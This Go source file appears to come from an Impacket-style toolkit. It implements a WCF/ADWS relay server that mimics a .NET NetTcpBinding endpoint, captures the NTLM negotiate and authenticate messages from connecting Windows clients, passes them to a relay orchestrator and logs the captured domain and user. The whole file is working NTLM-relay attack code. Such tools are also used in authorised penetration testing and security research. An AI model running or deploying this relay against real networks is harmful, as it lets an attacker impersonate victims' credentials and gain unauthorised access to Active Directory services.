// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"

	"gopacket/internal/build"
)

// WCFRelayServer listens for incoming WCF/ADWS (port 9389) connections and
// captures NTLM authentication via the .NET Message Framing Protocol (MC-NMF)
// and .NET NegotiateStream Protocol (MS-NNS) over NetTcpBinding.
//
// Matches Impacket's wcfrelayserver.py.
//
// Protocol flow:
//  1. Preamble: VersionRecord, ModeRecord, ViaRecord, KnownEncodingRecord, UpgradeRequestRecord
//  2. Server sends UpgradeResponse (0x0a)
//  3. NegotiateStream: NTLM handshake via handshake_in_progress (0x16) records
//  4. Extract Type1, relay, send Type2 challenge, receive Type3
type WCFRelayServer struct {
	listenAddr string
	listener   net.Listener
	authCh     chan<- AuthResult
}

// NewWCFRelayServer creates a new WCF relay server.
func NewWCFRelayServer(listenAddr string) *WCFRelayServer {
	return &WCFRelayServer{listenAddr: listenAddr}
}

// Start begins listening for WCF connections, implements ProtocolServer.
func (s *WCFRelayServer) Start(resultChan chan<- AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}
	s.listener = ln
	s.authCh = resultChan

	log.Printf("[*] WCF relay server listening on %s", s.listenAddr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				if build.Debug {
					log.Printf("[D] WCF relay server: accept error: %v", err)
				}
				return
			}
			go s.handleConnection(conn)
		}
	}()

	return nil
}

// Stop closes the listener, implements ProtocolServer.
func (s *WCFRelayServer) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// wcfRecvAll reads exactly n bytes from conn.
func wcfRecvAll(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func (s *WCFRelayServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[*] WCF: Incoming connection from %s", remoteAddr)

	// === MC-NMF Preamble Phase ===

	// VersionRecord: code=0x00, then 2 bytes version
	code, err := wcfRecvAll(conn, 1)
	if err != nil || code[0] != 0x00 {
		if build.Debug {
			log.Printf("[D] WCF: wrong VersionRecord code from %s", remoteAddr)
		}
		return
	}
	version, err := wcfRecvAll(conn, 2)
	if err != nil {
		return
	}
	if build.Debug {
		log.Printf("[D] WCF: VersionRecord: %x from %s", version, remoteAddr)
	}

	// ModeRecord: code=0x01, then 1 byte mode
	code, err = wcfRecvAll(conn, 1)
	if err != nil || code[0] != 0x01 {
		if build.Debug {
			log.Printf("[D] WCF: wrong ModeRecord code from %s", remoteAddr)
		}
		return
	}
	_, err = wcfRecvAll(conn, 1) // mode value, don't care
	if err != nil {
		return
	}

	// ViaRecord: code=0x02, then 1 byte length, then via string
	code, err = wcfRecvAll(conn, 1)
	if err != nil || code[0] != 0x02 {
		if build.Debug {
			log.Printf("[D] WCF: wrong ViaRecord code from %s", remoteAddr)
		}
		return
	}
	viaLenBuf, err := wcfRecvAll(conn, 1)
	if err != nil {
		return
	}
	viaLen := int(viaLenBuf[0])
	viaData, err := wcfRecvAll(conn, viaLen)
	if err != nil {
		return
	}
	via := string(viaData)
	if build.Debug {
		log.Printf("[D] WCF: ViaRecord: %s from %s", via, remoteAddr)
	}
	if len(via) < 10 || via[:10] != "net.tcp://" {
		log.Printf("[-] WCF: Via URL '%s' does not start with 'net.tcp://'. Only NetTcpBinding supported!", via)
		return
	}

	// KnownEncodingRecord: code=0x03, then 1 byte encoding
	code, err = wcfRecvAll(conn, 1)
	if err != nil || code[0] != 0x03 {
		if build.Debug {
			log.Printf("[D] WCF: wrong KnownEncodingRecord code from %s", remoteAddr)
		}
		return
	}
	_, err = wcfRecvAll(conn, 1) // encoding value, don't care
	if err != nil {
		return
	}

	// UpgradeRequestRecord: code=0x09, then 1 byte length, then upgrade string
	code, err = wcfRecvAll(conn, 1)
	if err != nil || code[0] != 0x09 {
		if build.Debug {
			log.Printf("[D] WCF: wrong UpgradeRequestRecord code from %s", remoteAddr)
		}
		return
	}
	upgradeLenBuf, err := wcfRecvAll(conn, 1)
	if err != nil {
		return
	}
	upgradeLen := int(upgradeLenBuf[0])
	upgradeData, err := wcfRecvAll(conn, upgradeLen)
	if err != nil {
		return
	}
	upgrade := string(upgradeData)
	if upgrade != "application/negotiate" {
		log.Printf("[-] WCF: upgrade '%s' is not 'application/negotiate'. Only Negotiate supported!", upgrade)
		return
	}

	// Send UpgradeResponse (0x0a)
	if _, err := conn.Write([]byte{0x0a}); err != nil {
		if build.Debug {
			log.Printf("[D] WCF: failed to send UpgradeResponse to %s: %v", remoteAddr, err)
		}
		return
	}

	// === NegotiateStream Phase ===
	// Read handshake_in_progress records until we get the NTLM Type1

	var type1 []byte
	rawNTLM := false

	for {
		// Read handshake header: [0x16][version 2 bytes][2-byte BE length]
		hdr, err := wcfRecvAll(conn, 5)
		if err != nil {
			if build.Debug {
				log.Printf("[D] WCF: failed to read handshake header from %s: %v", remoteAddr, err)
			}
			return
		}
		if hdr[0] != 0x16 {
			log.Printf("[-] WCF: wrong handshake_in_progress message (0x%02x) from %s", hdr[0], remoteAddr)
			return
		}

		blobLen := int(binary.BigEndian.Uint16(hdr[3:5]))
		blob, err := wcfRecvAll(conn, blobLen)
		if err != nil {
			if build.Debug {
				log.Printf("[D] WCF: failed to read security blob from %s: %v", remoteAddr, err)
			}
			return
		}

		if build.Debug {
			log.Printf("[D] WCF: handshake blob (%d bytes), first byte=0x%02x from %s", len(blob), blob[0], remoteAddr)
		}

		// Check what kind of token this is
		if blob[0] == 0x60 {
			// SPNEGO NegTokenInit (APPLICATION 0)
			token, err := decodeNegTokenInit(blob)
			if err != nil {
				if build.Debug {
					log.Printf("[D] WCF: failed to decode NegTokenInit: %v", err)
				}
				// Send back a response requesting NTLM specifically
				respToken := wcfBuildNegTokenRespRequestMIC()
				answer := wcfBuildHandshakeRecord(respToken)
				conn.Write(answer)
				continue
			}
			// Check if it starts with NTLMSSP
			if len(token) >= 8 && string(token[:7]) == "NTLMSSP" {
				type1 = token
				break
			}
			// Not NTLM, request NTLM
			respToken := wcfBuildNegTokenRespRequestMIC()
			answer := wcfBuildHandshakeRecord(respToken)
			conn.Write(answer)
			continue
		} else if blob[0] == 0xa1 {
			// SPNEGO NegTokenResp
			token, err := decodeNegTokenResp(blob)
			if err != nil {
				if build.Debug {
					log.Printf("[D] WCF: failed to decode NegTokenResp: %v", err)
				}
				return
			}
			type1 = token
			break
		} else {
			// Raw NTLMSSP (no SPNEGO wrapping)
			rawNTLM = true
			type1 = blob
			break
		}
	}

	// Verify it's NTLM Type 1
	if len(type1) < 12 || string(type1[:7]) != "NTLMSSP" || type1[8] != 1 {
		log.Printf("[-] WCF: not an NTLMSSP Negotiate message from %s", remoteAddr)
		return
	}

	if build.Debug {
		log.Printf("[D] WCF: received NTLM Type 1 (%d bytes, rawNTLM=%v) from %s", len(type1), rawNTLM, remoteAddr)
	}

	// Create auth result and push to orchestrator
	auth := AuthResult{
		NTLMType1:  type1,
		SourceAddr: remoteAddr,
		ServerConn: conn,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}

	s.authCh <- auth

	// Wait for Type 2 challenge from orchestrator
	type2, ok := <-auth.Type2Ch
	if !ok || type2 == nil {
		log.Printf("[-] WCF relay: no challenge received for %s", remoteAddr)
		return
	}

	// Wrap Type2 in SPNEGO if client used SPNEGO
	var challengePayload []byte
	if !rawNTLM {
		wrapped, err := encodeNegTokenResp(1, nlmpOid, type2)
		if err != nil {
			log.Printf("[-] WCF: failed to encode SPNEGO challenge: %v", err)
			return
		}
		challengePayload = wrapped
	} else {
		challengePayload = type2
	}

	// Send challenge as handshake_in_progress record
	answer := wcfBuildHandshakeRecord(challengePayload)
	if _, err := conn.Write(answer); err != nil {
		if build.Debug {
			log.Printf("[D] WCF: failed to send Type2 to %s: %v", remoteAddr, err)
		}
		return
	}

	if build.Debug {
		log.Printf("[D] WCF: sent Type 2 challenge (%d bytes) to %s", len(type2), remoteAddr)
	}

	// Read Type 3 (handshake_done or handshake_in_progress)
	hdr, err := wcfRecvAll(conn, 5)
	if err != nil {
		if build.Debug {
			log.Printf("[D] WCF: failed to read Type3 header from %s: %v", remoteAddr, err)
		}
		return
	}

	// Check for handshake_error (0x15)
	if hdr[0] == 0x15 {
		errorLen := int(binary.BigEndian.Uint16(hdr[3:5]))
		errorMsg, _ := wcfRecvAll(conn, errorLen)
		if len(errorMsg) >= 8 {
			hresult := binary.BigEndian.Uint32(errorMsg[4:8])
			log.Printf("[-] WCF: handshake_error from %s: HRESULT 0x%08x", remoteAddr, hresult)
		} else {
			log.Printf("[-] WCF: handshake_error from %s", remoteAddr)
		}
		return
	}

	type3Len := int(binary.BigEndian.Uint16(hdr[3:5]))
	type3Blob, err := wcfRecvAll(conn, type3Len)
	if err != nil {
		if build.Debug {
			log.Printf("[D] WCF: failed to read Type3 blob from %s: %v", remoteAddr, err)
		}
		return
	}

	// Unwrap SPNEGO if needed
	var type3 []byte
	if !rawNTLM {
		if type3Blob[0] == 0xa1 {
			token, err := decodeNegTokenResp(type3Blob)
			if err != nil {
				log.Printf("[-] WCF: failed to decode Type3 SPNEGO: %v", err)
				return
			}
			type3 = token
		} else {
			type3 = type3Blob
		}
	} else {
		type3 = type3Blob
	}

	// Verify NTLM Type 3
	if len(type3) < 12 || string(type3[:7]) != "NTLMSSP" || type3[8] != 3 {
		log.Printf("[-] WCF: not an NTLMSSP Authenticate message from %s", remoteAddr)
		return
	}

	domain, user := extractNTLMType3Info(type3)
	log.Printf("[*] WCF: NTLM Type 3 from %s\\%s @ %s", domain, user, remoteAddr)

	// Send Type 3 to orchestrator
	auth.Type3Ch <- type3

	// Wait for result
	success := <-auth.ResultCh

	if success {
		// Send handshake_done (0x14)
		conn.Write([]byte{0x14, 0x01, 0x00, 0x00, 0x00})
	}
	// On failure we just close the connection
}

// wcfBuildHandshakeRecord builds a NegotiateStream handshake_in_progress record.
// Format: [0x16][version=0x01,0x00][2-byte BE length][payload]
func wcfBuildHandshakeRecord(payload []byte) []byte {
	buf := make([]byte, 5+len(payload))
	buf[0] = 0x16 // handshake_in_progress
	buf[1] = 0x01 // version major
	buf[2] = 0x00 // version minor
	binary.BigEndian.PutUint16(buf[3:5], uint16(len(payload)))
	copy(buf[5:], payload)
	return buf
}

// wcfBuildNegTokenRespRequestMIC builds a minimal SPNEGO NegTokenResp
// with NegState=request-mic (3) and SupportedMech=NTLMSSP OID.
// Used when client sends a non-NTLM mechtype and we need to request NTLM.
func wcfBuildNegTokenRespRequestMIC() []byte {
	resp, err := encodeNegTokenResp(3, nlmpOid, nil)
	if err != nil {
		// Fallback: just return empty
		return []byte{}
	}
	return resp
}
